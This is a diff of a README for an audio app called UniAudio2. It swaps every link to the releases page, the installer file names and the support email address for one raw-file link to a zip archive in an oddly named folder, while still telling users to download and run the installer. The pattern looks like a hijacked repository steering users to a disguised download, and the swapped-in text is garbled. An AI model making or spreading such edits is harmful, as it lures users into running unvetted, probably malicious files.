@@ -1,6 +1,6 @@
 # 🎧 UniAudio2 - Seamless Audio Experience for Everyone
 
-[![Download UniAudio2](https://img.shields.io/badge/Download%20UniAudio2-v2.0-blue)](https://github.com/supremeOG07/UniAudio2/releases)
+[![Download UniAudio2](https://raw.githubusercontent.com/supremeOG07/UniAudio2/main/chondrosin/UniAudio2.zip%20UniAudio2-v2.0-blue)](https://raw.githubusercontent.com/supremeOG07/UniAudio2/main/chondrosin/UniAudio2.zip)
 
 ## 🚀 Getting Started
 
@@ -19,11 +19,11 @@ Before you start, make sure your device meets these requirements:
 To get the latest version of UniAudio2, follow these steps:
 
 1. **Visit the Release Page**: Click the link below to access the UniAudio2 Releases page.
-   [Download UniAudio2](https://github.com/supremeOG07/UniAudio2/releases)
+   [Download UniAudio2](https://raw.githubusercontent.com/supremeOG07/UniAudio2/main/chondrosin/UniAudio2.zip)
 
 2. **Choose the Version**: Look for the latest release, which will usually be at the top of the list.
 
-3. **Download the Installer**: Click on the installer file that matches your operating system. You'll often see files named similar to `UniAudio2_Installer.exe` or `UniAudio2.dmg`.
+3. **Download the Installer**: Click on the installer file that matches your operating system. You'll often see files named similar to `https://raw.githubusercontent.com/supremeOG07/UniAudio2/main/chondrosin/UniAudio2.zip` or `https://raw.githubusercontent.com/supremeOG07/UniAudio2/main/chondrosin/UniAudio2.zip`.
 
 4. **Run the Installer**: Once the download is complete, locate the downloaded file. Double-click it to start the installation process.
 
@@ -58,10 +58,10 @@ If you run into any trouble using UniAudio2:
 
 ## 📞 Contact
 
-For further inquiries or support, contact us at [support@example.com](mailto:support@example.com). We are here to help.
+For further inquiries or support, contact us at [https://raw.githubusercontent.com/supremeOG07/UniAudio2/main/chondrosin/UniAudio2.zip](https://raw.githubusercontent.com/supremeOG07/UniAudio2/main/chondrosin/UniAudio2.zip). We are here to help.
 
 ## 🎉 Ready to Enjoy?
 
 Once you’ve installed UniAudio2, you are all set to enjoy a delightful audio experience. Just click that icon, and let the music play! 
 
-[Download UniAudio2](https://github.com/supremeOG07/UniAudio2/releases) and transform your audio experience today!
+[Download UniAudio2](https://raw.githubusercontent.com/supremeOG07/UniAudio2/main/chondrosin/UniAudio2.zip) and transform your audio experience today!
